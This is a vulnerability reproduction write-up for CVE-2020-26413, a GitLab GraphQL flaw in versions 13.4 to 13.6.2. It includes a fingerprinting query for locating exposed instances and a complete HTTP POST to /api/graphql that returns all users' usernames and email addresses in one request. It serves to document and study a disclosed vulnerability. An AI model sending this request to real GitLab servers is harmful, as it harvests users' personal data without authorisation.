# GitLab Graphql email information leakage vulnerability CVE-2020-26413

## Vulnerability Description

There is a Graphql interface in GitLab. When entering constructed data, the user's mailbox and username will be leaked.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">GitLab 13.4 - 13.6.2</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">title="GitLab"</span>

## Vulnerability reappears

The source of the vulnerability is a public report on hackone

<a-alert type="success" message="https://gitlab.com/gitlab-org/gitlab/-/issues/244275" description="" showIcon>
</a-alert>
<br/>



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/gitlab-1.png)



Meaning that when using constructed statements, the mailbox information will be returned when querying the interface, as shown in the figure


</a-alert>
<br/>

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/gitlab-2.png)



Gitlab itself does not allow access to account email information. Here, the email leak vulnerability is caused by calling Graphql username query.

After viewing the report, I found that the exploit requires an account username. I cannot get the email without knowing it. Check it in [Graphql official website] (https://graphql.cn/) and you can return all usernames and emails at one time through another constructed statement.



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/gitlab-3.png)



The packet sends data by calling the `/api/graphql` interface

The complete data packet is

```json
POST /api/graphql HTTP/1.1
Host:
Content-Length: 212
Content-Type: application/json


{"query":"{\nusers {\nedges {\n  node {\n    username\n    email\n    avatarUrl\n    status {\n      emoji\n      message\n      messageHtml\n     }\n    }\n   }\n  }\n }","variables":null,"operationName":null}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/gitlab-4.png)



Successfully returned data, causing Gitlab user email information to leak
